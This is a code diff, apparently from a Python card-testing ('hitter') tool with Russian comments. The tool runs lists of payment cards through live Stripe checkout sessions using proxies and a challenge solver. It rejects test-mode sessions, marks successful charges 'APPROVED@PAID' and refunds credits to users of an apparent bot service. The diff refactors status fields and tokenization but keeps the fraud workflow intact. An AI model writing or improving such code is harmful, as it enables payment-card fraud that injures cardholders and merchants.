@@ -275,11 +275,10 @@ class CsHitSession:
             tok_headers["Cookie"] = telem["cookie_header"]
 
         try:
-            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
-                                      data=gc.tokenize_body(card, telem, self.url),
-                                      headers=tok_headers, timeout=10)
-            td = r_tok.json()
-            _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
+            # Общий путь токенизации: самолечение недокументированных параметров (аудит 2026-09, D-03)
+            td = await gc.tokenize_payment_method(
+                self.s, gc.tokenize_body(card, telem, self.url),
+                headers=tok_headers, timeout=10, label="hit")
         except Exception as e:
             return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
         if "id" not in td:
@@ -613,13 +612,18 @@ async def qualify_session(target_url: str, proxy: str | None = None,
     - Radar-риски и рекомендации.
 
     Возвращает структурированный диагностический словарь:
-    (viable, status, amount_cents, currency, three_d_secure, recommendation).
+    (viable, session_status, amount_cents, currency, three_d_secure, recommendation).
+
+    Поле называется session_status, а НЕ status: это состояние сессии Stripe ("open",
+    "COMPLETE", "TEST_MODE", "INVALID_URL", "HTTP_400"...), а не вердикт карты. Раньше оно
+    называлось status и в любом месте, прогнанном через config.coerce_verdict, давало
+    UNKNOWN без возврата кредита (аудит 2026-09, G-10).
     """
     pk, cs = extract_session_and_key(target_url)
     if not pk.startswith("pk_live") or not cs.startswith("cs_"):
         return {
             "viable": False,
-            "status": "INVALID_URL",
+            "session_status": "INVALID_URL",
             "amount_cents": 0,
             "currency": "",
             "three_d_secure": "unknown",
@@ -640,7 +644,7 @@ async def qualify_session(target_url: str, proxy: str | None = None,
             if r.status_code != 200:
                 return {
                     "viable": False,
-                    "status": f"HTTP_{r.status_code}",
+                    "session_status": f"HTTP_{r.status_code}",
                     "amount_cents": 0,
                     "currency": "",
                     "three_d_secure": "unknown",
@@ -667,7 +671,7 @@ async def qualify_session(target_url: str, proxy: str | None = None,
             if not livemode or is_sandbox:
                 return {
                     "viable": False,
-                    "status": "TEST_MODE",
+                    "session_status": "TEST_MODE",
                     "amount_cents": amount,
                     "currency": currency,
                     "three_d_secure": three_ds_req,
@@ -681,7 +685,7 @@ async def qualify_session(target_url: str, proxy: str | None = None,
             if sess_status in ("complete", "expired"):
                 return {
                     "viable": False,
-                    "status": str(sess_status).upper(),
+                    "session_status": str(sess_status).upper(),
                     "amount_cents": amount,
                     "currency": currency,
                     "three_d_secure": three_ds_req,
@@ -706,7 +710,7 @@ async def qualify_session(target_url: str, proxy: str | None = None,
 
             return {
                 "viable": viable,
-                "status": sess_status,
+                "session_status": sess_status,
                 "pi_status": pi_status,
                 "mode": mode,
                 "amount_cents": amount,
@@ -725,7 +729,7 @@ async def qualify_session(target_url: str, proxy: str | None = None,
     except Exception as e:
         return {
             "viable": False,
-            "status": "EXCEPTION",
+            "session_status": "EXCEPTION",
             "amount_cents": 0,
             "currency": "",
             "three_d_secure": "unknown",
@@ -756,8 +760,10 @@ async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
     gs = CsHitSession(target_url, proxy=norm_proxy, use_ctoken=use_ctoken, challenge_solver=challenge_solver)
     ok, detail = await gs.open()
     if not ok:
+        # status — таксономия (ERROR: сессия не открылась, это свойство цели), pipeline — FAILED.
         return {
-            "status": "FAILED",
+            "status": "ERROR",
+            "pipeline": "FAILED",
             "viable": False,
             "detail": f"open failed: {detail}",
             "results": [],
@@ -803,8 +809,17 @@ async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
     finally:
         await gs.close()
 
+    # status — только класс таксономии (его читают бот и CLI), состояние прогона — pipeline.
+    # Раньше сюда писались SUCCESS/COMPLETED: через coerce_verdict они становились UNKNOWN,
+    # то есть без возврата кредита (аудит 2026-09, G-10).
+    if terminal_hit:
+        final_status = "APPROVED@PAID"
+    else:
+        final_status = config.coerce_verdict(str((results[-1].get("status") if results else "") or "ERROR"))
+    last_pipeline = "SUCCESS" if terminal_hit else ("COMPLETED" if results else "FAILED")
     return {
-        "status": "SUCCESS" if terminal_hit else "COMPLETED",
+        "status": final_status,
+        "pipeline": last_pipeline,
         "viable": True,
         "pi_id": gs.pi_id,
         "amount_cents": gs.amount,
